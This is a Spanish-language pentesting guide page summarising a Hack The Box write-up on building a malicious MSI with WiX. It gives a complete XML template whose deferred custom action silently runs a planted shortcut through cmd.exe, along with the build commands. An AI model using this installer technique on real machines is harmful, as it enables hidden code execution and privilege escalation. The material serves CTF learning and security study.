# Creando un MSI malicioso y obteniendo root

{{#include ../../banners/hacktricks-training.md}}

La creación del instalador MSI se realizará mediante wixtools; específicamente, se utilizará [wixtools](http://wixtoolset.org). Cabe mencionar que se probaron otros creadores de MSI, pero no funcionaron correctamente en este caso concreto.<sup>[[1]](#references)</sup>

Para comprender de forma exhaustiva los ejemplos de uso de wix MSI, se recomienda consultar [esta página](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Aquí se pueden encontrar varios ejemplos que muestran el uso de wix MSI.<sup>[[2]](#references)</sup>

El objetivo es generar un MSI que ejecute el archivo lnk. Para lograrlo, se podría utilizar el siguiente código XML ([xml de aquí](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Es importante señalar que el elemento Package contiene atributos como InstallerVersion y Compressed, que especifican la versión del instalador e indican si el paquete está comprimido o no, respectivamente.

El proceso de creación implica utilizar candle.exe, una herramienta de wixtools, para generar un wixobject a partir de msi.xml. Debe ejecutarse el siguiente comando:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Además, cabe mencionar que en la publicación se proporciona una imagen que muestra el comando y su salida. Puedes consultarla como guía visual.<sup>[[1]](#references)</sup>

Además, se utilizará light.exe, otra herramienta de wixtools, para crear el archivo MSI a partir del wixobject. El comando que se ejecutará es el siguiente:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Al igual que en el comando anterior, se incluye una imagen en la publicación que ilustra el comando y su salida.<sup>[[1]](#references)</sup>

Ten en cuenta que, aunque este resumen pretende proporcionar información valiosa, se recomienda consultar la publicación original para obtener detalles más completos e instrucciones precisas.<sup>[[1]](#references)</sup>

## Referencias

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Una introducción rápida: crear un instalador MSI con WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (consulta también [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
